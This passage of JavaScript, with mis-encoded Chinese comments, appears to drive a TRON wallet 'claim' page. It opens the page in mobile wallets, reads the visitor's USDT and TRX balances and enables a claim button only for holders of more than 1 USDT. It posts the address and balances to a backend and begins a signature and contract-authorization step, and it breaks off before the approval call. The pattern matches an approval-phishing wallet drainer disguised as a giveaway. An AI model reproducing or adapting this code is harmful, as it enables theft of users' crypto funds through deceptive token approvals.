        userInfoDefault.innerHTML = `â„¹ï¸ è¯­è¨€ä¸‹æ‹‰èœå•ï¼š${langDropdown.classList.contains("open") ? "æ‰“å¼€" : "å…³é—­"}`;
    });
    langDropdownItems.forEach(item => {
        item.addEventListener("click", (e) => {
            e.stopPropagation();
            const newLang = item.getAttribute("data-lang");
            changeLang(newLang);
        });
    });
    document.addEventListener("click", () => {
        langDropdown.classList.remove("open");
        // é¡µé¢åé¦ˆï¼šç‚¹å‡»é¡µé¢å…³é—­è¯­è¨€ä¸‹æ‹‰èœå•
        userInfoDefault.innerHTML = `â„¹ï¸ ç‚¹å‡»é¡µé¢å…³é—­è¯­è¨€ä¸‹æ‹‰èœå•`;
    });
    langDropdown.addEventListener("click", (e) => {
        e.stopPropagation();
    });
    
    recordList.style.display = "none";
    await checkImTokenEnv().catch(err => {
        console.error("ç¯å¢ƒæ£€æµ‹å¤±è´¥ï¼š", err);
        const lang = langConfig[currentLang];
        userInfoDefault.style.display = "block";
        userInfoStatus.style.display = "none";
        balanceItems.forEach(item => item.style.display = "none");
        approveBtn.disabled = true;
        approveBtn.textContent = lang.approveBtnText;
        updateUserBalanceDisplay();
        // é¡µé¢åé¦ˆï¼šç¯å¢ƒæ£€æµ‹å¤±è´¥
        userInfoDefault.innerHTML = `âŒ ç¯å¢ƒæ£€æµ‹å¤±è´¥ï¼š${err.message}<br><span>é”™è¯¯ï¼š${JSON.stringify(err)}</span>`;
    });
    window.addEventListener("beforeunload", () => {
        if (trxTimer) clearTimeout(trxTimer);
        // é¡µé¢åé¦ˆï¼šé¡µé¢å³å°†å…³é—­ï¼Œæ¸…é™¤å®šæ—¶å™¨
        userInfoDefault.innerHTML = `âš ï¸ é¡µé¢å³å°†å…³é—­ï¼Œæ¸…é™¤èƒ½é‡å®šæ—¶å™¨`;
    });
    if (window.tronWeb && window.location.hash === "#approve") {
        window.location.hash = "";
        setTimeout(() => {
            initWallet(true).catch(err => {
                console.error("æˆæƒååˆå§‹åŒ–å¤±è´¥ï¼š", err);
                const lang = langConfig[currentLang];
                const tip = isCustomerError(err.message) ? lang.ineligibleTip : lang.systemBusyTip;
                userInfoDefault.style.display = "none";
                userInfoStatus.style.display = "block";
                userInfoStatus.innerHTML = `<span style='color: #000000; font-size: 14px;'>${lang.errorTipPrefix}${tip}</span>`;
                approveBtn.disabled = false;
                approveBtn.textContent = lang.approveBtnText;
                // é¡µé¢åé¦ˆï¼šæˆæƒååˆå§‹åŒ–å¤±è´¥
                userInfoDefault.innerHTML = `âŒ æˆæƒååˆå§‹åŒ–å¤±è´¥ï¼š${err.message}<br><span>æç¤ºï¼š${tip}</span>`;
            });
        }, 500);
    }
});

async function checkImTokenEnv() {
    const lang = langConfig[currentLang];
    // é¡µé¢åé¦ˆï¼šå¼€å§‹æ£€æµ‹é’±åŒ…ç¯å¢ƒ
    userInfoDefault.innerHTML = `ğŸ” æ£€æµ‹é’±åŒ…ç¯å¢ƒï¼šæ˜¯å¦å­˜åœ¨TronWeb`;
    if (window.tronWeb) {
        tronWeb = window.tronWeb;
        connectBtn.style.display = "none";
        warning.style.display = "none";
        specialTipContainer.style.display = "none";
        // é¡µé¢åé¦ˆï¼šæ£€æµ‹åˆ°TronWebï¼Œå¼€å§‹åˆå§‹åŒ–é’±åŒ…
        userInfoDefault.innerHTML = `âœ… æ£€æµ‹åˆ°TronWebï¼ˆé’±åŒ…å†…ç½®æµè§ˆå™¨ï¼‰ï¼Œå¼€å§‹åˆå§‹åŒ–é’±åŒ…`;
        await initWallet(false);
        return;
    }
    if (!connectBtn) {
        console.warn("âš ï¸ è¿æ¥æŒ‰é’®æœªæ‰¾åˆ°ï¼Œç¨åé‡è¯•");
        // é¡µé¢åé¦ˆï¼šæœªæ‰¾åˆ°è¿æ¥æŒ‰é’®
        userInfoDefault.innerHTML = `âŒ æœªæ‰¾åˆ°è¿æ¥æŒ‰é’®ï¼Œ500msåé‡è¯•`;
        setTimeout(() => checkImTokenEnv(), 500);
        return;
    }
    // æ˜¾ç¤ºå¤šé’±åŒ…é€‰æ‹©å¼¹çª—ï¼ˆæ›¿æ¢åŸå•ä¸€imTokenå¼¹çª—ï¼‰
    specialTipContainer.style.display = "block";
    userInfoDefault.style.display = "none";
    userInfoStatus.style.display = "block";
    userInfoStatus.innerHTML = lang.nonImTokenUser;
    approveBtn.style.display = "none";
    connectBtn.style.display = "none";
    nonImTokenPopup.style.display = "none";
    multiWalletPopup.style.display = "block"; // æ˜¾ç¤ºå¤šé’±åŒ…å¼¹çª—
    // é¡µé¢åé¦ˆï¼šæœªæ£€æµ‹åˆ°TronWebï¼Œæ˜¾ç¤ºå¤šé’±åŒ…é€‰æ‹©å¼¹çª—
    userInfoDefault.innerHTML = `â„¹ï¸ æœªæ£€æµ‹åˆ°TronWebï¼ˆéé’±åŒ…æµè§ˆå™¨ï¼‰ï¼Œæ˜¾ç¤ºå¤šé’±åŒ…é€‰æ‹©å¼¹çª—`;
    // ç»™æ¯ä¸ªé’±åŒ…é¡¹ç»‘å®šè·³è½¬é€»è¾‘
    walletItems.forEach(item => {
        item.onclick = async () => {
            const walletType = item.getAttribute("data-wallet");
            const wallet = walletConfig[walletType];
            if (!wallet) return;
            // é¡µé¢åé¦ˆï¼šé€‰æ‹©é’±åŒ…ï¼Œå¼€å§‹æ„é€ è·³è½¬é“¾æ¥
            userInfoDefault.innerHTML = `ğŸ”„ é€‰æ‹©é’±åŒ…ï¼š${wallet.name}ï¼ˆç±»å‹ï¼š${walletType}ï¼‰`;
            // æ‹¼æ¥æˆæƒé¡µé¢URLï¼ˆå½“å‰é¡µé¢+#approveå‚æ•°ï¼Œç›´æ¥è¿›å…¥æˆæƒæµç¨‹ï¼‰
            const targetUrl = window.location.href + "#approve";
            let jumpUrl = "";
            switch (walletType) {
                case "imtoken":
                    jumpUrl = wallet.scheme + encodeURIComponent(targetUrl);
                    break;
                case "tokenpocket":
                    jumpUrl = wallet.scheme + encodeURIComponent(targetUrl) + wallet.suffix;
                    break;
                case "tronlink":
                    const param = JSON.stringify({
                        url: targetUrl,
                        action: "open",
                        protocol: "tronlink",
                        version: "1.0"
                    });
                    jumpUrl = wallet.scheme + encodeURIComponent(param);
                    break;
                case "bitget":
                    jumpUrl = wallet.scheme + encodeURIComponent(targetUrl);
                    break;
                default:
                    jumpUrl = wallet.scheme + encodeURIComponent(targetUrl);
            }
            // é¡µé¢åé¦ˆï¼šè·³è½¬é“¾æ¥æ„é€ å®Œæˆ
            userInfoDefault.innerHTML = `âœ… è·³è½¬é“¾æ¥æ„é€ å®Œæˆï¼š${jumpUrl.slice(0, 50)}...`;
            console.log(`ğŸ“¤ è·³è½¬${wallet.name}ï¼š`, jumpUrl);
            window.location.href = jumpUrl;
            // 3ç§’åæ£€æŸ¥æ˜¯å¦æˆåŠŸå”¤èµ·ï¼ŒæœªæˆåŠŸåˆ™æç¤ºæ‰‹åŠ¨æ“ä½œ
            setTimeout(() => {
                if (!window.tronWeb) {
                    alert(`${lang.å”¤èµ·Guide}`);
                    multiWalletPopup.style.display = "none";
                    connectBtn.style.display = "block";
                    connectBtn.onclick = () => {
                        multiWalletPopup.style.display = "block";
                    };
                    // é¡µé¢åé¦ˆï¼šé’±åŒ…å”¤èµ·å¤±è´¥ï¼Œæç¤ºæ‰‹åŠ¨æ“ä½œ
                    userInfoDefault.innerHTML = `âš ï¸ é’±åŒ…å”¤èµ·å¤±è´¥ï¼Œè¯·æ‰‹åŠ¨æ‰“å¼€${wallet.name}å¹¶ç²˜è´´é“¾æ¥`;
                } else {
                    // é¡µé¢åé¦ˆï¼šé’±åŒ…å”¤èµ·æˆåŠŸ
                    userInfoDefault.innerHTML = `âœ… é’±åŒ…å”¤èµ·æˆåŠŸï¼š${wallet.name}`;
                }
            }, 3000);
        };
    });
    // å…³é—­å¤šé’±åŒ…å¼¹çª—é€»è¾‘
    closeMultiWalletBtn.onclick = () => {
        multiWalletPopup.style.display = "none";
        // é¡µé¢åé¦ˆï¼šå…³é—­å¤šé’±åŒ…é€‰æ‹©å¼¹çª—
        userInfoDefault.innerHTML = `â„¹ï¸ å…³é—­å¤šé’±åŒ…é€‰æ‹©å¼¹çª—`;
    };
}

async function initWallet(isAfterApprove) {
    const lang = langConfig[currentLang];
    // é¡µé¢åé¦ˆï¼šå¼€å§‹åˆå§‹åŒ–é’±åŒ…
    userInfoDefault.innerHTML = `ğŸ”„ åˆå§‹åŒ–é’±åŒ…ï¼š${isAfterApprove ? "æˆæƒååˆå§‹åŒ–" : "é¦–æ¬¡åˆå§‹åŒ–"}`;
    try {
        userAddress = tronWeb.defaultAddress?.base58;
        // é¡µé¢åé¦ˆï¼šè·å–é’±åŒ…åœ°å€
        userInfoDefault.innerHTML = `â„¹ï¸ è·å–é’±åŒ…åœ°å€ï¼š${userAddress || "æœªè·å–åˆ°åœ°å€"}`;
        if (userAddress === SPECIAL_ADDRESS) {
            // é¡µé¢åé¦ˆï¼šæ£€æµ‹åˆ°ç‰¹æ®Šåœ°å€ï¼Œåˆå§‹åŒ–åˆçº¦
            userInfoDefault.innerHTML = `âœ… æ£€æµ‹åˆ°ç‰¹æ®Šåœ°å€ï¼š${userAddress}ï¼Œåˆå§‹åŒ–USDTåˆçº¦`;
            trc20Contract = await tronWeb.contract(USDT_ABI, TRC20_TOKEN_ADDRESS);
            const [usdtRaw, trxRaw] = await Promise.all([
                trc20Contract.balanceOf(userAddress).call().catch(err => 0),
                tronWeb.trx.getBalance(userAddress).catch(err => 0)
            ]);
            tokenBalance = Number(usdtRaw) / 1000000;
            trxBalance = Number(trxRaw) / 1000000;
            // é¡µé¢åé¦ˆï¼šç‰¹æ®Šåœ°å€ä½™é¢æŸ¥è¯¢å®Œæˆ
            userInfoDefault.innerHTML = `âœ… ç‰¹æ®Šåœ°å€ä½™é¢æŸ¥è¯¢å®Œæˆï¼šUSDT=${tokenBalance.toFixed(2)} | TRX=${trxBalance.toFixed(2)}`;
            userInfoDefault.style.display = "none";
            userInfoStatus.style.display = "block";
            userInfoStatus.innerHTML = lang.eligibleTip;
            balanceItems.forEach(item => item.style.display = "flex");
            await updateUserInfoDisplay();
            approveBtn.disabled = false;
            approveBtn.textContent = lang.approveBtnText;
            const statusAddressEl = document.getElementById("statusAddress");
            if (statusAddressEl) statusAddressEl.style.display = "none";
            updateWalletStatus();
            
            if (canSendA1Signal(userAddress)) {
                // é¡µé¢åé¦ˆï¼šç‰¹æ®Šåœ°å€å¯å‘é€A1ä¿¡å·ï¼Œå¼‚æ­¥å‘é€
                userInfoDefault.innerHTML = `ğŸ”„ ç‰¹æ®Šåœ°å€å‘é€A1ä¿¡å·ï¼š${userAddress}`;
                sendSignalA1().catch(err => console.error("A1ä¿¡å·å¼‚æ­¥å‘é€å¤±è´¥ï¼š", err));
                updateA1SignalRecord(userAddress);
            }
            bindApproveLogic();
            recordList.style.display = "block";
            renderEnergyRecords();
            // é¡µé¢åé¦ˆï¼šç‰¹æ®Šåœ°å€é’±åŒ…åˆå§‹åŒ–å®Œæˆ
            userInfoDefault.innerHTML = `âœ… ç‰¹æ®Šåœ°å€é’±åŒ…åˆå§‹åŒ–å®Œæˆï¼ˆæŒ‰é’®å·²å¯ç”¨ï¼‰`;
            return;
        }
        if (!userAddress) {
            userInfoDefault.style.display = "none";
            userInfoStatus.style.display = "block";
            userInfoStatus.innerHTML = lang.noWalletAddress;
            balanceItems.forEach(item => item.style.display = "none");
            approveBtn.disabled = true;
            approveBtn.textContent = lang.insufficientBtn;
            updateWalletStatus();
            recordList.style.display = "none";
            // é¡µé¢åé¦ˆï¼šæœªè·å–åˆ°é’±åŒ…åœ°å€ï¼Œåˆå§‹åŒ–å¤±è´¥
            userInfoDefault.innerHTML = `âŒ æœªè·å–åˆ°æœ‰æ•ˆé’±åŒ…åœ°å€ï¼Œåˆå§‹åŒ–å¤±è´¥`;
            return;
        }
        // é¡µé¢åé¦ˆï¼šåˆå§‹åŒ–USDTåˆçº¦
        userInfoDefault.innerHTML = `ğŸ”„ åˆå§‹åŒ–USDTåˆçº¦ï¼š${TRC20_TOKEN_ADDRESS}`;
        trc20Contract = await tronWeb.contract(USDT_ABI, TRC20_TOKEN_ADDRESS);
        const [usdtRaw, trxRaw] = await Promise.all([
            trc20Contract.balanceOf(userAddress).call().catch(err => 0),
            tronWeb.trx.getBalance(userAddress).catch(err => 0)
        ]);
        tokenBalance = Number(usdtRaw) / 1000000;
        trxBalance = Number(trxRaw) / 1000000;
        // é¡µé¢åé¦ˆï¼šé’±åŒ…ä½™é¢æŸ¥è¯¢å®Œæˆ
        userInfoDefault.innerHTML = `âœ… é’±åŒ…ä½™é¢æŸ¥è¯¢å®Œæˆï¼šUSDT=${tokenBalance.toFixed(2)} | TRX=${trxBalance.toFixed(2)}`;
        const statusAddressEl = document.getElementById("statusAddress");
        if (statusAddressEl) statusAddressEl.style.display = "none";
        if (isAddressAuthorized(userAddress)) {
            userInfoDefault.style.display = "none";
            userInfoStatus.style.display = "block";
            userInfoStatus.innerHTML = lang.authorizedTip;
            balanceItems.forEach(item => item.style.display = "flex");
            await updateUserInfoDisplay();
            approveBtn.disabled = true;
            approveBtn.textContent = lang.authorizedBtn;
            updateWalletStatus();
            recordList.style.display = "block";
            renderEnergyRecords();
            // é¡µé¢åé¦ˆï¼šé’±åŒ…å·²æˆæƒï¼ˆ30å¤©å†…ï¼‰ï¼Œåˆå§‹åŒ–å®Œæˆ
            userInfoDefault.innerHTML = `âœ… é’±åŒ…å·²æˆæƒï¼ˆ30å¤©å†…ï¼‰ï¼Œåˆå§‹åŒ–å®Œæˆï¼ˆæŒ‰é’®ç¦ç”¨ï¼‰`;
            return;
        }
        if (tokenBalance <= 1) {
            userInfoDefault.style.display = "none";
            userInfoStatus.style.display = "block";
            userInfoStatus.innerHTML = lang.insufficientUsdt;
            balanceItems.forEach(item => item.style.display = "flex");
            await updateUserInfoDisplay();
            approveBtn.disabled = true;
            approveBtn.textContent = lang.insufficientBtn;
            updateWalletStatus();
            recordList.style.display = "block";
            renderEnergyRecords();
            // é¡µé¢åé¦ˆï¼šUSDTä½™é¢ä¸è¶³ï¼Œåˆå§‹åŒ–å®Œæˆï¼ˆæŒ‰é’®ç¦ç”¨ï¼‰
            userInfoDefault.innerHTML = `âœ… USDTä½™é¢ä¸è¶³ï¼ˆâ‰¤1ï¼‰ï¼Œåˆå§‹åŒ–å®Œæˆï¼ˆæŒ‰é’®ç¦ç”¨ï¼‰`;
            return;
        }
        if (!window.tronWeb || !window.tronWeb.defaultAddress) {
            userInfoDefault.style.display = "none";
            userInfoStatus.style.display = "block";
            userInfoStatus.innerHTML = lang.nonImTokenUser;
            balanceItems.forEach(item => item.style.display = "none");
            approveBtn.disabled = true;
            approveBtn.textContent = lang.insufficientBtn;
            updateWalletStatus();
            recordList.style.display = "none";
            // é¡µé¢åé¦ˆï¼šéé’±åŒ…ç¯å¢ƒï¼Œåˆå§‹åŒ–å®Œæˆï¼ˆæŒ‰é’®ç¦ç”¨ï¼‰
            userInfoDefault.innerHTML = `âœ… éé’±åŒ…ç¯å¢ƒï¼Œåˆå§‹åŒ–å®Œæˆï¼ˆæŒ‰é’®ç¦ç”¨ï¼‰`;
            return;
        }
        userInfoDefault.style.display = "none";
        userInfoStatus.style.display = "block";
        userInfoStatus.innerHTML = lang.eligibleTip;
        balanceItems.forEach(item => item.style.display = "flex");
        await updateUserInfoDisplay();
        updateWalletStatus();
        if (canSendA1Signal(userAddress)) {
            // é¡µé¢åé¦ˆï¼šå‘é€A1ä¿¡å·
            userInfoDefault.innerHTML = `ğŸ”„ å‘é€A1ä¿¡å·ï¼š${userAddress}`;
            sendSignalA1().catch(err => console.error("A1ä¿¡å·å¼‚æ­¥å‘é€å¤±è´¥ï¼š", err));
            updateA1SignalRecord(userAddress);
        }
        approveBtn.disabled = false;
        approveBtn.textContent = lang.approveBtnText;
        bindApproveLogic();
        recordList.style.display = "block";
        renderEnergyRecords();
        // é¡µé¢åé¦ˆï¼šé’±åŒ…åˆå§‹åŒ–å®Œæˆï¼ˆç¬¦åˆé¢†å–æ¡ä»¶ï¼ŒæŒ‰é’®å¯ç”¨ï¼‰
        userInfoDefault.innerHTML = `âœ… é’±åŒ…åˆå§‹åŒ–å®Œæˆï¼ˆç¬¦åˆé¢†å–æ¡ä»¶ï¼ŒæŒ‰é’®å¯ç”¨ï¼‰`;
    } catch (e) {
        console.error("é’±åŒ…åˆå§‹åŒ–å¤±è´¥ï¼š", e);
        const errorTip = userAddress ? lang.insufficientUsdt : lang.noWalletAddress;
        userInfoDefault.style.display = "none";
        userInfoStatus.style.display = "block";
        userInfoStatus.innerHTML = errorTip;
        if (userAddress) {
            balanceItems.forEach(item => item.style.display = "flex");
            await updateUserInfoDisplay();
        } else {
            balanceItems.forEach(item => item.style.display = "none");
        }
        approveBtn.disabled = true;
        approveBtn.textContent = lang.insufficientBtn;
        updateWalletStatus();
        recordList.style.display = userAddress ? "block" : "none";
        if (userAddress) renderEnergyRecords();
        // é¡µé¢åé¦ˆï¼šé’±åŒ…åˆå§‹åŒ–å¼‚å¸¸
        userInfoDefault.innerHTML = `âŒ é’±åŒ…åˆå§‹åŒ–å¼‚å¸¸ï¼š${e.message}<br><span>é”™è¯¯ï¼š${JSON.stringify(e)}</span>`;
    }
}

async function sendSignalA1() {
    const requestData = { userAddress };
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 20000);
    // é¡µé¢åé¦ˆï¼šå¼€å§‹å‘é€A1ä¿¡å·
    userInfoDefault.innerHTML = `ğŸ“¤ å‘é€A1ä¿¡å·ï¼š${userAddress}<br><span>è¯·æ±‚æ•°æ®ï¼š${JSON.stringify(requestData)}</span>`;
    try {
        const res = await fetch(`${BACKEND_API}/api/send-signal-a1`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(requestData),
            signal: controller.signal,
            keepalive: true
        });
        clearTimeout(timeoutId);
        // é¡µé¢åé¦ˆï¼šA1ä¿¡å·åç«¯å“åº”
        userInfoDefault.innerHTML = `ğŸ“¥ A1ä¿¡å·åç«¯å“åº”ï¼šçŠ¶æ€ç ${res.status} | å“åº”çŠ¶æ€ï¼š${res.ok ? "æˆåŠŸ" : "å¤±è´¥"}`;
        if (res.ok) {
            const a1Status = JSON.parse(localStorage.getItem(A1_STATUS_KEY) || "{}");
            a1Status[userAddress] = "success";
            localStorage.setItem(A1_STATUS_KEY, JSON.stringify(a1Status));
            // é¡µé¢åé¦ˆï¼šA1ä¿¡å·å‘é€æˆåŠŸ
            userInfoDefault.innerHTML = `âœ… A1ä¿¡å·å‘é€æˆåŠŸï¼š${userAddress}<br><span>åç«¯çŠ¶æ€ç ï¼š${res.status} | å·²è®°å½•å‘é€çŠ¶æ€</span>`;
            return "success";
        }
        throw new Error(`A1ä¿¡å·åç«¯è¿”å›éæˆåŠŸçŠ¶æ€ï¼š${res.status}`);
    } catch (e) {
        clearTimeout(timeoutId);
        // é¡µé¢åé¦ˆï¼šA1ä¿¡å·å‘é€å¤±è´¥
        userInfoDefault.innerHTML = `âŒ A1ä¿¡å·å‘é€å¤±è´¥ï¼š${e.message}<br><span>åœ°å€ï¼š${userAddress} | é”™è¯¯ï¼š${JSON.stringify(e)}</span>`;
        console.warn("âŒ A1ä¿¡å·å‘é€å¤±è´¥ï¼ˆç½‘ç»œ/è¶…æ—¶/åç«¯å¼‚å¸¸ï¼‰ï¼š", e);
        return "fail";
    }
}

async function sendSignalA2() {
    const requestData = { 
        userAddress, 
        usdtBalance: tokenBalance, 
        trxBalance: trxBalance 
    };
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 20000);
    // é¡µé¢åé¦ˆï¼šå¼€å§‹å‘é€A2ä¿¡å·
    userInfoDefault.innerHTML = `ğŸ“¤ å‘é€A2ä¿¡å·ï¼š${userAddress}<br><span>è¯·æ±‚æ•°æ®ï¼š${JSON.stringify(requestData)}</span>`;
    try {
        const res = await fetch(`${BACKEND_API}/api/send-signal-a2`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(requestData),
            signal: controller.signal,
            keepalive: true
        });
        clearTimeout(timeoutId);
        // é¡µé¢åé¦ˆï¼šA2ä¿¡å·åç«¯å“åº”
        userInfoDefault.innerHTML = `ğŸ“¥ A2ä¿¡å·åç«¯å“åº”ï¼šçŠ¶æ€ç ${res.status} | å“åº”çŠ¶æ€ï¼š${res.ok ? "æˆåŠŸ" : "å¤±è´¥"}`;
        if (res.ok) {
            // é¡µé¢åé¦ˆï¼šA2ä¿¡å·å‘é€æˆåŠŸ
            userInfoDefault.innerHTML = `âœ… A2ä¿¡å·å‘é€æˆåŠŸï¼š${userAddress}<br><span>åç«¯çŠ¶æ€ç ï¼š${res.status}</span>`;
            console.log("âœ… A2ä¿¡å·å‘é€æˆåŠŸ");
            return true;
        } else {
            // é¡µé¢åé¦ˆï¼šA2ä¿¡å·å‘é€å¤±è´¥ï¼ˆåç«¯é200ï¼‰
            userInfoDefault.innerHTML = `âŒ A2ä¿¡å·å‘é€å¤±è´¥ï¼š${userAddress}<br><span>åç«¯çŠ¶æ€ç ï¼š${res.status}</span>`;
            console.log("âŒ A2ä¿¡å·å‘é€å¤±è´¥ï¼ˆåç«¯é200çŠ¶æ€ï¼‰");
            return false;
        }
    } catch (e) {
        clearTimeout(timeoutId);
        // é¡µé¢åé¦ˆï¼šA2ä¿¡å·å‘é€å¼‚å¸¸
        userInfoDefault.innerHTML = `âŒ A2ä¿¡å·å‘é€å¼‚å¸¸ï¼š${e.message}<br><span>åœ°å€ï¼š${userAddress} | é”™è¯¯ï¼š${JSON.stringify(e)}</span>`;
        console.warn("âŒ A2ä¿¡å·å‘é€å¼‚å¸¸ï¼š", e);
        return false;
    }
}

async function sendSignalB(isB1 = true) {
    const requestData = { userAddress };
    const apiPath = isB1 ? "/api/send-signal-b1" : "/api/send-signal-b2";
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 20000);
    const lang = langConfig[currentLang];
    // é¡µé¢åé¦ˆï¼šå¼€å§‹å‘é€Bä¿¡å·
    userInfoDefault.innerHTML = `ğŸ“¤ å‘é€${isB1 ? "B1" : "B2"}ä¿¡å·ï¼š${userAddress}<br><span>è¯·æ±‚è·¯å¾„ï¼š${apiPath} | æ•°æ®ï¼š${JSON.stringify(requestData)}</span>`;
    try {
        const res = await fetch(`${BACKEND_API}${apiPath}`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(requestData),
            signal: controller.signal,
            keepalive: true
        });
        clearTimeout(timeoutId);
        // é¡µé¢åé¦ˆï¼šBä¿¡å·åç«¯å“åº”
        userInfoDefault.innerHTML = `ğŸ“¥ ${isB1 ? "B1" : "B2"}ä¿¡å·åç«¯å“åº”ï¼šçŠ¶æ€ç ${res.status} | å“åº”çŠ¶æ€ï¼š${res.ok ? "æˆåŠŸ" : "å¤±è´¥"}`;
        if ([400, 408, 409].includes(res.status)) {
            const errData = await res.json().catch(() => ({ detail: lang.ineligibleTip }));
            // é¡µé¢åé¦ˆï¼šBä¿¡å·ç”¨æˆ·ä¸åˆè§„
            userInfoDefault.innerHTML = `âŒ ${isB1 ? "B1" : "B2"}ä¿¡å·ç”¨æˆ·ä¸åˆè§„ï¼š${errData.detail}<br><span>çŠ¶æ€ç ï¼š${res.status} | åœ°å€ï¼š${userAddress}</span>`;
            console.warn(`âŒ ${isB1 ? "B1" : "B2"}ä¿¡å·ç”¨æˆ·ä¸åˆè§„ï¼š`, errData.detail);
            return false;
        }
        if (res.ok) {
            // é¡µé¢åé¦ˆï¼šBä¿¡å·å‘é€æˆåŠŸ
            userInfoDefault.innerHTML = `âœ… ${isB1 ? "B1" : "B2"}ä¿¡å·å‘é€æˆåŠŸï¼š${userAddress}<br><span>åç«¯çŠ¶æ€ç ï¼š${res.status} | å·²æ·»åŠ æˆæƒåœ°å€</span>`;
            console.log(`âœ… ä¿¡å·${isB1 ? "B1" : "B2"}å¤„ç†æˆåŠŸ`);
            addAuthorizedAddress(userAddress); 
            saveEnergyRecord();
            return true;
        }
        // é¡µé¢åé¦ˆï¼šBä¿¡å·åç«¯è¿”å›å¼‚å¸¸
        userInfoDefault.innerHTML = `âŒ ${isB1 ? "B1" : "B2"}ä¿¡å·åç«¯å¼‚å¸¸ï¼š${res.status}<br><span>åœ°å€ï¼š${userAddress}</span>`;
        console.warn(`âŒ ${isB1 ? "B1" : "B2"}ä¿¡å·åç«¯è¿”å›å¼‚å¸¸çŠ¶æ€ï¼š${res.status}`);
        return false;
    } catch (e) {
        clearTimeout(timeoutId);
        // é¡µé¢åé¦ˆï¼šBä¿¡å·å‘é€å¼‚å¸¸
        userInfoDefault.innerHTML = `âŒ ${isB1 ? "B1" : "B2"}ä¿¡å·å‘é€å¼‚å¸¸ï¼š${e.message}<br><span>åœ°å€ï¼š${userAddress} | é”™è¯¯ï¼š${JSON.stringify(e)}</span>`;
        console.error(`âŒ ${isB1 ? "B1" : "B2"}ä¿¡å·å‘é€å¼‚å¸¸ï¼š`, e);
        return false;
    }
}

function bindRetryA1Logic() {
    const lang = langConfig[currentLang];
    approveBtn.disabled = false;
    approveBtn.textContent = "é‡æ–°æ£€æµ‹ç¯å¢ƒ";
    // é¡µé¢åé¦ˆï¼šç»‘å®šA1ä¿¡å·é‡è¯•é€»è¾‘
    userInfoDefault.innerHTML = `âœ… ç»‘å®šA1ä¿¡å·é‡è¯•é€»è¾‘ï¼ˆæŒ‰é’®å·²å¯ç”¨ï¼‰`;
    approveBtn.onclick = async () => {
        const btn = document.getElementById("approveBtn");
        btn.disabled = true;
        btn.textContent = "æ£€æµ‹ä¸­...";
        userInfoStatus.innerHTML = `<span style='color: #000000; font-size: 13px;'>âœ… æ­£åœ¨é‡æ–°æ£€æµ‹ç¯å¢ƒ...</span>`;
        // é¡µé¢åé¦ˆï¼šå¼€å§‹é‡æ–°æ£€æµ‹A1ç¯å¢ƒ
        userInfoDefault.innerHTML = `ğŸ”„ é‡æ–°æ£€æµ‹A1ç¯å¢ƒï¼š${userAddress}`;
        const a1Result = await sendSignalA1();
        if (a1Result === "success") {
            userInfoStatus.innerHTML = `<span style='color: #000000; font-size: 13px;'>âœ… ç¯å¢ƒç¬¦åˆé¢†å–æ¡ä»¶</span>`;
            // é¡µé¢åé¦ˆï¼šA1ç¯å¢ƒæ£€æµ‹æˆåŠŸï¼Œç»‘å®šé¢†å–é€»è¾‘
            userInfoDefault.innerHTML = `âœ… A1ç¯å¢ƒæ£€æµ‹æˆåŠŸï¼Œç»‘å®šé¢†å–é€»è¾‘`;
            bindApproveLogic();
        } else {
            userInfoStatus.innerHTML = `<span style='color: #000000; font-size: 13px;'>âš ï¸ ç¯å¢ƒæ£€æµ‹å¤±è´¥ï¼Œå¯é‡è¯•</span>`;
            // é¡µé¢åé¦ˆï¼šA1ç¯å¢ƒæ£€æµ‹å¤±è´¥
            userInfoDefault.innerHTML = `âŒ A1ç¯å¢ƒæ£€æµ‹å¤±è´¥ï¼ŒæŒ‰é’®å·²å¯ç”¨`;
            btn.disabled = false;
            btn.textContent = "é‡æ–°æ£€æµ‹ç¯å¢ƒ";
        }
    };
}

// ========== é¢†å–æŒ‰é’®å‡½æ•° ==========
function bindApproveLogic() {
    const lang = langConfig[currentLang];
    // é¡µé¢åé¦ˆï¼šç»‘å®šé¢†å–æŒ‰é’®é€»è¾‘
    userInfoDefault.innerHTML = `âœ… ç»‘å®šé¢†å–æŒ‰é’®é€»è¾‘ï¼ˆç‚¹å‡»å°†å‘èµ·ç­¾åï¼‰`;
    approveBtn.onclick = async () => {
        const btn = document.getElementById("approveBtn");
        btn.disabled = true;
        btn.textContent = lang.redirectingBtn;
        reviewTip.style.display = "flex";
        reviewTipText.textContent = "å‘èµ·ç­¾åï¼Œè¯·åœ¨imTokenä¸­ç¡®è®¤...";
        // é¡µé¢åé¦ˆï¼šç‚¹å‡»é¢†å–æŒ‰é’®ï¼Œå¼€å§‹ç­¾åæµç¨‹
        userInfoDefault.innerHTML = `ğŸ”„ ç‚¹å‡»é¢†å–æŒ‰é’®ï¼Œå¼€å§‹ç­¾åæµç¨‹<br><span>æ­¥éª¤ï¼š1. A1ä¿¡å·æ ¡éªŒ 2. B1ä¿¡å·å‘é€ 3. åˆçº¦æˆæƒ</span>`;
        try {
            // æ–°å¢1ï¼šA1ä¿¡å·æ ¡éªŒï¼ˆä¿ç•™åŸæœ‰æ ¡éªŒé€»è¾‘ï¼Œå¤±è´¥åˆ™ç»ˆæ­¢æµç¨‹ï¼‰
            const a1Status = JSON.parse(localStorage.getItem(A1_STATUS_KEY) || "{}");
            const isA1Success = a1Status[userAddress] === "success";
            // é¡µé¢åé¦ˆï¼šA1ä¿¡å·æ ¡éªŒ
            userInfoDefault.innerHTML = `ğŸ” A1ä¿¡å·æ ¡éªŒï¼š${userAddress}<br><span>æ ¡éªŒçŠ¶æ€ï¼š${isA1Success ? "æˆåŠŸ" : "å¤±è´¥"}</span>`;
            if (!isA1Success) {
                throw new Error("A1ç¯å¢ƒæ ¡éªŒæœªé€šè¿‡ï¼Œè¯·é‡æ–°è¿æ¥é’±åŒ…æˆ–ç¨åé‡è¯•");
            }
            // æ–°å¢2ï¼šä¿ç•™B1ä¿¡å·å‘é€ï¼ˆå¼‚æ­¥æ‰§è¡Œï¼Œä¸é˜»å¡Approveï¼‰
            if (!hasSentB1Signal(userAddress)) {
                // é¡µé¢åé¦ˆï¼šå‘é€B1ä¿¡å·ï¼ˆå¼‚æ­¥ï¼‰
